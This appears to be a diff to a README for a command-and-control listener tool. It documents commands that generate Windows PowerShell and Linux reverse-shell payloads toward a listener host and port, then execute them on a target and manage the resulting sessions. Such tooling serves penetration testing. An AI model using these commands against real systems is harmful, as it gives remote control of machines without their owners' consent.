@@ -65,9 +65,6 @@ cd lstnr
 
 <img width="938" alt="Screenshot 2025-04-15 at 9 06 55 PM" src="https://github.com/user-attachments/assets/77e2f37d-f591-4e19-be66-2b73e438fb94" />
 
-- When a session is established, `ls` will always verify
-
-<img width="932" alt="Screenshot 2025-03-19 at 5 35 01 PM" src="https://github.com/user-attachments/assets/9ecff40b-c14d-4a9a-adf9-cc04fb15e7b4" />
 
 - To build reverse shells for Windows PowerShell
 ```
@@ -79,6 +76,11 @@ payload windows -lhost <IP> -lport <PORT>
 payload linux -lhost <IP> -lport <PORT>
 ```
 ![image](https://github.com/user-attachments/assets/655a628c-bcd5-4aac-b7c1-6d76cad63c52)
+
+- Execute the reverse shells on TGT to get a session LSTNR
+- When a session is established, `ls` will verify
+
+<img width="927" alt="Screenshot 2025-04-15 at 9 18 20 PM" src="https://github.com/user-attachments/assets/7167dc57-cee1-4fb0-998e-c01dd6acd7cf" />
 
 - Connecting to a session with `cs <id>` 
 - To update the sessions table, run `whoami` and `hostname`
